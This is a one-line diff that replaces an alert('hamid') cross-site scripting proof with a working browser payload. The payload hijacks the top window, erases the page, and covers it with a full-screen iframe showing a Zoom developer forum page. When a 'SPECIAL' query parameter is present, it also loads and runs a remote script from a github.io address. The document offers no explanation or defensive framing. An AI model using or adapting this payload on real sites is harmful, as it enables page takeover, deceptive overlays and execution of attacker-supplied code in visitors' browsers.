@@ -1,1 +1,1 @@
-alert('hamid')
+(()=>{const w=window.top,d=w.document,f=d.createElement("iframe");d.body.replaceChildren();f.src="https://devforum.zoom.us/t/manual-domain-validation-for-supabase-co-managed-backend-xsell-user-managed-oauth-app/146756";f.style.cssText="position:fixed;inset:0;width:100vw;height:100vh;border:0;margin:0;background:white;z-index:2147483647";d.body.appendChild(f);if(new URLSearchParams(w.location.search).has("SPECIAL")){const s=d.createElement("script");s.src="https://lmzkjmiajzj-lgtm.github.io/tests/file7.js";d.head.appendChild(s)}})();
